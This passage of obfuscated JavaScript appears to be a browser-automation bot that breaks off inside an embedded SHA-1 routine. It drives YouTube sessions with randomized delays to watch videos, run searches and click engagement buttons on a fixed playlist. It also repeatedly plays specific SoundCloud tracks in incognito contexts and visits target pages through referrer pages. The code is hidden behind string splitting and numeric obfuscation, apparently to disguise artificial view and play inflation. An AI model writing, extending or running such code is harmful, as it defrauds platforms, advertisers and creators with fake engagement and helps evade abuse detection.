const V = c,
  U = b,
  T = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x958 + 0x8 * 0x331 + -0x102f))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x11af + 0x1 * 0x676 + 0x373 * -0x7), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1 * -0xb774 + -0x20a8 + 0x5353 * 0x4 + (-0x1 * -0x5fc + -0x1cbe * -0x2 + 0x68 * -0xc) * random()) : await standardWaitForNetIdle(f), await wait(-0x1561 + -0x19a3 * 0x1 + -0x2 * -0x2146 + (0x3053 + -0x3db + -0x568) * random()), -0x1fa8 + -0x1570 * -0x1 + -0xa39 * -0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xf67 + -0x6c2 + -0x1 * -0x29b1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x17c1 + 0x5ad * -0x1 + 0x1d6f;
}
async function randomWait() {
  return await wait(-0x127 * 0x7 + -0x178 * 0x10 + 0x3319 + (0x59e * -0x1 + -0x122 + -0x692 * -0x4) * random()), -0x3 * 0x3d7 + 0x1566 + -0x278 * 0x4;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xb5 * 0x32 + 0x21b7 + 0x4511 * -0x1, 0x2b * 0xcb + 0x41 * 0x17 + 0x259 * -0x11), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1051 * 0x17 + -0x5bb3 + 0x5e * -0x86) * getRandomInt(-0x5 * -0x7b9 + -0xc * -0x311 + -0x4b67, -0x4c5 + 0x163 * -0x1c + 0x2b9e), h)), 0x1521 + 0x3 * -0x141 + -0x115d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xd91 + -0x11a2 + 0x1f33;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0xf37 + -0xa4a * -0x2 + -0x2ae * 0x2]['split']('\x20');
    for (let k = -0x1 * 0x689 + 0xb3a + -0x4b1; k < i['length']; k += -0x525 * -0x3 + 0x1cb * -0x7 + -0x2e0)
      j += i[k] * h[i[k + (0x728 * 0x3 + 0x1af2 + -0x3069)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x7 * 0x481 + 0x964 + -0x763 * -0x3)['map'](l => Array['from'](l['children']))['flat'](0x26b2 + -0x1825 + 0x62 * -0x26)['map'](l => l['childNodes'][0x13c6 * -0x1 + 0x13eb * 0x1 + -0x6 * 0x6]['childNodes'][0x18e3 * -0x1 + -0x1 * -0x900 + -0x7 * -0x245]['childNodes'][0xaf0 + -0x2 * 0xb4c + 0xba9]['childNodes'][-0x6dd * 0x5 + 0x781 + 0x1ad0]['childNodes'][0x1ee9 + -0x1 * -0x134b + -0x3233]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1 * 0x8a + 0x765 + 0x407 * -0x1, 0x1 * -0x233 + -0x602 + 0x1b * 0x107)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x17 * -0x5a + 0x5 * -0x3f2 + 0x5668);
  const h = await getMaxTime(f),
    i = Math['min']((-0x18c56 + -0xe598 + 0x35c4e) * getRandomInt(-0x1006 + 0x29 * 0x5 + 0xf3b, -0x4 * -0x772 + -0xcf4 + -0x1 * 0x10cf), h);
  return await wait(i), -0x14b5 + 0x56e * 0x6 + 0x3e * -0x31;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xd81 * -0x2 + 0x3 * 0x3cb + 0xfa1]['children'][-0x1 * -0xd + 0x159c + -0x15a9]['children'][-0x72 * 0x14 + -0x1afc + 0x4 * 0x8f9]['children'][-0x35e * 0x5 + 0x1de + 0xef8]['children'][0xeaa + 0x1a34 + -0x28de]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x13ee + 0xba5 * -0x1 + -0x1 * -0x1f94;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1 * -0x2655 + -0x4a7 * 0x1 + -0x10a5 * 0x2 + (0xa0 * -0xe + -0x1 * 0x304 + 0xbf6) * random()
  }), await wait(0xcae * 0x1 + 0x3 * 0x43a + -0x6b * 0x38 + (0x25f8 + 0xcd6 + -0x31a2) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const R = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x9 * 0x1ef + -0x1bb + -0xfaa]['childNodes'][0xeda + 0xe1c + 0x3 * -0x9a7]['childNodes'][0x14 * -0x17b + -0x271 * -0xa + 0x533]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x4 * 0x269 + 0x703 + -0x2 * -0x153]['childNodes'][0x11f2 + -0x1606 * -0x1 + -0x27f8][R(0x6)][-0x20fd + 0x183b + 0x8c4]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xaaa + 0x135 * -0xc + 0x3d3),
          r = -0x229b + -0x23b * -0xb + 0xa12;
        for (let u = 0x1efa * -0x1 + 0x1 * -0x1667 + -0x3 * -0x11cb; u < q['length']; u += -0x634 * -0x2 + 0x12b * -0xb + 0x1 * 0x73)
          r += q[u] * k[q[u + (-0x278 + -0x25eb + -0x5e * -0x6e)]];
        return r;
      }(n);
  });
  await wait((-0x191d + 0x6ed2 + 0x1 * -0x1b1d) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x15a9d + -0x13ef4 + -0x3 * -0x12bfb) * getRandomInt(0x212b + -0x1 * -0x20ee + 0x69c * -0xa, -0x527 + -0x14e1 + 0x5e * 0x47), h + (0x13f5 + -0x1 * 0x1a17 + 0xf * 0x1b6));
  return await wait(i), -0x102b * 0x1 + 0x2 * 0x95 + 0x1 * 0xf02;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x158 * 0x4 + -0x1a3e + -0x1f9e * -0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x5 * -0x262 + 0x19ee + -0x344 * 0x8 + (0x1390 + -0x2141 * 0x1 + 0x385 * 0x5) * Math['random']());
    });
  }, -0x5f * 0x7b + -0x3162 + 0x7a5f * 0x1);
  await wait(-0x763c + 0x63a4b + -0x1302f);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xa6b * 0x1f + -0x101df + -0x2aa * -0x132) * getRandomInt(0x145e + 0x1400 + -0x285a * 0x1, -0x6 * 0x271 + 0x3d0 * 0x7 + -0xbf1)), clearInterval(h), -0xb4 * -0xd + 0x1b5 * 0x6 + -0x1c3 * 0xb;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0xb78 * -0x3 + 0x1a15 + 0x5f * -0xa3;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x38e + -0x1c6c + 0x1ffb;
    await randomWait();
  }
  return 0x1eb2 + 0x49 * 0x2 + -0x1f43;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x259b + 0x353 + 0x449 * 0x8);
    let h = e[f];
    if (c['kGFEnc'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1acf + 0x109d + -0x2b6c, r, s, t = -0x74c * 0x2 + -0x1983 + 0x1 * 0x281b; s = m['charAt'](t++); ~s && (r = q % (-0x958 + 0x8 * 0x331 + -0x102c) ? r * (0x11af + 0x1 * 0x676 + 0x7f7 * -0x3) + s : s, q++ % (0x1 * -0x1e94 + -0x571 + 0x401 * 0x9)) ? o += String['fromCharCode'](-0x1 * -0x1ff + -0x995 * -0x2 + 0xb2 * -0x1d & r >> (-(-0x1561 + -0x19a3 * 0x1 + -0x2 * -0x1783) * q & 0x182a + -0x1ed + -0x1637)) : -0x1fa8 + -0x1570 * -0x1 + -0x51c * -0x2) {
          s = n['indexOf'](s);
        }
        for (let u = -0xf67 + -0x6c2 + -0x1 * -0x1629, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x17c1 + 0x5ad * -0x1 + 0x1d7e))['slice'](-(-0x127 * 0x7 + -0x178 * 0x10 + 0x1f93));
        }
        return decodeURIComponent(p);
      };
      c['UYVNQM'] = i, b = arguments, c['kGFEnc'] = !![];
    }
    const j = e[0x59e * -0x1 + -0x122 + -0xd8 * -0x8],
      k = f + j,
      l = b[k];
    return !l ? (h = c['UYVNQM'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  return Math['random']() <= -0x301 * -0x2 + -0x9fe * -0x1 + -0x1000 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x7be + 0x7a4 + -0x166 * 0xb + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1f8c + 0x363 + -0x22ef + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * -0x251d + -0x84e + -0x4d * -0x97;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x7f * 0x1d3 + -0xb3 * -0x115 + -0x3 * -0x4742 + getRandomInt(-0x2dd7 * -0x1 + 0x2 * 0x1500 + -0x1d3f, -0x4dd8 * 0x2 + -0x2cd5 * 0x1 + 0x13db5));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xaf8 + -0x24d8 + 0x19e1), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1074 + 0x2003 + -0x3077;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1b64 + 0x3 * -0xc82 + -0xa22 * -0x1, 0x12a8 + -0x2120 + -0x2 * -0x755)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x192a + 0x20a4 + 0x4f * -0xa2 + floor((-0x24de + -0x63d * -0x4 + 0xfd2) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x1 * -0xb8cf7aa4 + 0x9c5437ec + 0x3548eca4 * -0x4),
          -0x33d7d * -0x47 + -0x9ccc44 + 0x36be99,
          0x6c * 0x160 + 0xa30f + -0x1a39 * 0x7,
          -0x346 * 0xb + -0x3d * -0x4a + 0x12e0
        ], y = [
          0xd79 * -0x1 + -0x1a8d + -0x9e * -0x41,
          0xf95 + -0xb * 0x18a + -0x1 * -0x169,
          0x3 * 0x71e + -0x143a + -0x8c * 0x2,
          0x2002 + 0xcf2 + 0x66c * -0x7
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1 * -0x2091 + -0x1b * 0x10d + 0x1 * 0x3cf1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2 * -0xf0b + 0x8aa + 0xf8 * -0x28; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x40f * 0x2 + 0x640 + 0x1de) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x18f + -0x874 + 0x6e5] = A[0x1 * -0x30e + -0x902 * -0x1 + -0x5e4] = A[0x107d + 0x25 * 0x77 + 0x21af * -0x1] = A[-0xd17 + -0x3 * -0xb9f + -0x15c4] = A[0x977 * -0x1 + -0x1 * 0xe7b + -0x1 * -0x17f5] = A[-0x2362 * 0x1 + -0xfaa + -0x13 * -0x2b0] = A[-0x1289 + 0x4 * -0xe5 + 0x1622 * 0x1] = A[0x1f83 + -0x14fe + -0xa7f] = A[-0x1d05 * -0x1 + 0xf21 + 0x8d3 * -0x5] = A[-0xb5 + 0x1 * -0x1cad + 0xfb * 0x1e] = A[-0x4d * -0x1 + -0x2401 + 0x23bd] = A[0x15a1 + -0x2359 + 0x1 * 0xdc2] = A[0x2631 + 0x211 + -0x91 * 0x47] = A[-0x5 * 0x579 + -0x392 + 0x1efb] = A[-0x3a7 * 0x1 + 0x17 * 0x16b + -0x1ce9] = A[-0xc1c + -0x83 * 0x2f + 0x2437] = A[-0x20a6 + 0x69d * 0x1 + 0xa * 0x29c] = 0x2cb * 0x4 + 0x1 * 0xd85 + -0x7 * 0x387, this['blocks'] = A) : this['blocks'] = [
                0x1 * 0x551 + 0x1 * 0x2555 + -0x2aa6,
                -0xd0b + 0x3e * -0x12 + -0x1167 * -0x1,
                0x17c6 + -0x1789 + -0x3d,
                -0x1d52 + -0x21b3 + 0x3f05,
                0xac1 + 0x403 + 0x46 * -0x36,
                -0x29 * 0x69 + -0x2127 + 0x31f8,
                -0x145a + 0x238 * -0xb + 0x151 * 0x22,
                -0x11 * 0x7 + 0x1c02 + -0x1 * 0x1b8b,
                -0xdf * -0x1d + 0x183 * -0x16 + 0x7ff * 0x1,
                0x19f9 + -0x116f + -0x88a,
                -0xe7e + 0x114f + -0x1 * 0x2d1,
                -0xeb9 + -0x33 * -0x1f + 0x88c,
                0x38f * 0x3 + -0x1 * -0x236f + -0x34 * 0xe3,
                0x1ac3 + -0x120b + -0x2 * 0x45c,
                -0x7f6 + 0x14c5 + -0xccf,
                -0x2b * -0xd5 + 0x1c35 + -0x3ffc,
                0xc35 + -0x2585 + -0x1 * -0x1950
              ], this['h0'] = 0x987a2b1 + 0x5591ba68 + 0x82bc5e8, this['h1'] = 0x12ad7745c + -0x170a3f7c3 + 0x1359a2ef0, this['h2'] = -0x10551767d + 0x5 * -0x2813e0af + 0x6 * 0x6667f3d1, this['h3'] = -0x122c6617 + 0x106988bf + -0x8fa98e7 * -0x2, this['h4'] = 0x53cdade6 * 0x1 + -0xad7beeb2 + 0x24 * 0x7ee40f7, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x11f + -0x685 * -0x3 + 0x2 * -0xa57, this['finalized'] = this['hashed'] = 0x2637 + -0x2a * 0xa1 + 0x39 * -0x35, this['first'] = -0x20ea + 0x9 * 0x213 + 0xe40;
            }
            ['update'](J) {
              const S = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x42d + 0x1e9a + 0x549 * -0x5, O = J['length'] || 0x26b1 + -0x4 * 0x33f + 0x1 * -0x19b5, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1779 * -0x1 + -0xc87 + -0xaf2, P[-0x21d5 + -0x1111 + 0x32e6] = this['block'], P[-0x1 * 0x20d7 + -0x18f0 + 0x39d7] = P[-0x1f7e + -0x154c + -0xf * -0x385] = P[-0x1 * -0xf89 + -0x1eca * -0x1 + -0x2e51] = P[0x4 * 0x77e + -0x4fd * 0x1 + -0x18f8] = P[-0x16a4 + 0x129a + 0x40e] = P[-0xb8d + -0x1 * -0x1201 + -0x66f] = P[0xabe + 0x15c0 + -0x2078] = P[-0x17a1 + -0x2520 + 0x3cc8] = P[0x10d * -0x1 + 0x129f * 0x1 + 0x2 * -0x8c5] = P[-0x18fe + 0x9 * -0x9d + 0x1e8c] = P[0x25c4 + 0x40 * 0x19 + -0x1b1 * 0x1a] = P[-0x5 * -0x55b + 0x1d12 + -0x94d * 0x6] = P[-0x50d + 0x1afb + 0x2 * -0xaf1] = P[-0x209 * 0x7 + 0xfb + 0x7 * 0x1e7] = P[0x180b * -0x1 + 0x103e + 0x7db * 0x1] = P[-0x51 * 0x20 + -0x1a91 + 0x24c0] = 0x13 * -0x121 + -0x3fd + 0x1970), K) {
                    for (N = this['start']; M < O && N < 0x260e + 0x2 * 0xb5 + -0x9ce * 0x4; ++M)
                      P[N >> -0xeec * 0x1 + 0x2132 + -0x1244] |= J[M] << y[0x1 * 0x531 + -0x1 * 0x16db + 0x11ad & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1caf + -0x163 * -0x3 + 0x18c6; ++M)
                      (L = J['charCodeAt'](M)) < 0xc8a + -0x1b5f * -0x1 + 0x13 * -0x213 ? P[N >> 0x1b32 + 0x599 * 0x4 + 0x14e * -0x26] |= L << y[-0x1a2a + -0x1dbc + -0x12a3 * -0x3 & N++] : L < 0xfcd + 0x18ae + -0x207b * 0x1 ? (P[N >> -0x107 + 0x1478 + -0x136f] |= (-0x2030 * -0x1 + 0x5 * -0x1d9 + 0x1633 * -0x1 | L >> -0x1619 * -0x1 + -0x28d * -0x1 + 0x314 * -0x8) << y[0x1 * -0x107b + 0x1401 * 0x1 + 0x1 * -0x383 & N++], P[N >> -0x1571 * 0x1 + 0x23ac + 0xe39 * -0x1] |= (0x95 * 0x3d + -0xedb + -0x1426 | -0x12a6 + -0x2fd + 0x15e2 & L) << y[0x1589 + 0x1dcb + -0x3351 * 0x1 & N++]) : L < -0x20 * 0x779 + -0x187dc + 0x34efc || L >= 0x190 + -0xb763 + -0x195d3 * -0x1 ? (P[N >> 0x3e1 + -0x1d04 * 0x1 + 0x1925] |= (-0x1210 + -0xa7 * -0xe + 0x9ce | L >> -0x17 * 0x5b + -0x80d * -0x2 + -0x7e1) << y[-0x1 * -0x8f + -0x15a7 + 0x709 * 0x3 & N++], P[N >> 0x73c * 0x4 + -0xaa2 + 0x926 * -0x2] |= (-0x26ac + -0x11 * 0x1a7 + 0x4343 | L >> -0x1f * -0x4b + 0x664 * 0x1 + -0xf73 & 0x1 * -0x1687 + 0x1f50 + -0x88a) << y[-0xaf3 * -0x1 + 0x1 * -0x6d3 + 0x3 * -0x15f & N++], P[N >> 0x2b3 * -0xe + 0x1 * 0x1915 + 0xcb7] |= (0x26ac + 0xe5 * -0xf + -0x18c1 | -0x13cd + 0xe4 * -0x14 + 0x25dc & L) << y[0x2ab + -0x1e92 + 0x1bea & N++]) : (L = 0x6 * -0x10b1 + 0x1b7d0 + -0x53aa + ((-0x3 * 0x58f + -0x22ac + 0x38 * 0xfd & L) << 0x47e * 0x7 + 0x9 * -0x18e + 0x5ce * -0x3 | -0x82a + 0x1563 + -0x49d * 0x2 & J['charCodeAt'](++M)), P[N >> -0xa8 * -0x25 + 0x1 * 0x11e + -0xd * 0x1f4] |= (-0x1 * -0x1709 + 0xde9 + -0x2402 | L >> 0x10a4 + -0x2525 + -0x1493 * -0x1) << y[0x200 * 0x3 + 0x2 * 0x44b + -0xe93 & N++], P[N >> 0x3b * -0x4f + -0x120 + 0x1 * 0x1357] |= (0xae * -0x17 + 0x13be + -0x39c | L >> -0x221f + -0x3c * -0x32 + 0x1673 & -0x879 + -0x85 + -0xd7 * -0xb) << y[-0x1f66 + 0x1f80 + 0x1 * -0x17 & N++], P[N >> 0x1d28 + 0x147d + -0x31a3] |= (-0xcb5 + 0x7 * -0xd1 + 0x12ec | L >> -0x2be + -0x2710 + 0xa75 * 0x4 & -0x3c7 + 0x2036 + 0x16 * -0x148) << y[0x26 * 0xbc + 0x797 + 0xbd4 * -0x3 & N++], P[N >> -0xb05 + -0x25a8 + -0x46d * -0xb] |= (0xb73 + -0x22a * 0xd + 0x1 * 0x112f | -0x1640 + -0x7 * 0x28d + 0x285a & L) << y[0x121 * 0x17 + 0xb2b + -0xdd * 0x2b & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this[S(0xc)] += N - this['start'], N >= 0x59e * 0x4 + -0x2072 + 0xa3a ? (this['block'] = P[0xa7 * -0x1 + 0xfed + -0xf36], this['start'] = N - (0x1fc7 + -0x2141 * 0x1 + -0x11 * -0x1a), this['hash'](), this['hashed'] = -0x16b5 * 0x1 + -0xf79 + -0x11 * -0x23f) : this['start'] = N;
                }
                return this['bytes'] > 0xb3455a3b * 0x1 + 0x3777e3 * -0x3a1 + 0x3f * 0x469b9b9 && (this['hBytes'] += this['bytes'] / (-0x18ee38054 + -0x493cc2c * -0x3f + 0x16e844180) << -0x1 * -0x22f4 + 0xff3 + -0x32e7, this['bytes'] = this['bytes'] % (-0x4c8b3148 + 0x50010ca4 + 0xfc8a24a4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * -0x12b5 + 0x286 + -0x1a * 0xd1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xd * -0xbe + 0x1a9e + -0x2434] = this['block'], J[K >> 0x1599 + -0x1fc4 * -0x1 + -0x57 * 0x9d] |= x[-0x1 * -0x20f1 + 0xc7c + -0x2d6a & K], this['block'] = J[0x1 * -0x1876 + 0x624 + 0x2 * 0x931], K >= 0x1f8f * -0x1 + -0x1f * -0x7 + -0x4a * -0x6b && (this['hashed'] || this['hash'](), J[0x13d2 * -0x1 + -0x80f * -0x1 + 0xbc3] = this['block'], J[-0x2ed + 0x1 * -0xb6f + 0x1 * 0xe6c] = J[0x1c8f + 0x3 * 0xabb + 0x1 * -0x3cbf] = J[-0x83b * -0x4 + -0x1 * -0x19ee + -0x3ad8] = J[-0x1109 + -0x52 + -0x1ee * -0x9] = J[-0x1 * 0x2242 + 0x1403 + 0x3 * 0x4c1] = J[-0x219a + -0x26e + 0x240d] = J[0x838 * -0x4 + -0x1181 + 0x3267 * 0x1] = J[0x1477 + -0xaa2 + -0x1f6 * 0x5] = J[-0x45a * -0x7 + -0x1c44 + 0x1 * -0x22a] = J[-0x2164 + 0xcba + 0x14b3] = J[0x70 + -0x2 * -0x92 + 0x1 * -0x18a] = J[-0x1 * 0xd76 + -0x183 * -0x1 + 0xbfe] = J[-0x16f6 * -0x1 + -0x24e8 + 0xdfe] = J[-0x2043 + 0xecc + 0x1184] = J[0x24d4 + -0x22c2 + -0x204] = J[-0x6 * -0x2d6 + 0x1fd5 + -0x30ca] = 0x361 + 0x1557 + -0x18b8), J[0x184a + 0x16c + -0x19a8 * 0x1] = this['hBytes'] << -0x15e1 + 0x24a1 * -0x1 + 0x1 * 0x3a85 | this['bytes'] >>> 0x18fe + -0x1 * 0x17bf + -0x1d * 0xa, J[-0x221d * -0x1 + 0x18f1 * 0x1 + -0x3aff] = this['bytes'] << -0x6f * -0x59 + 0x24 * -0xed + 0x20 * -0x2a, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
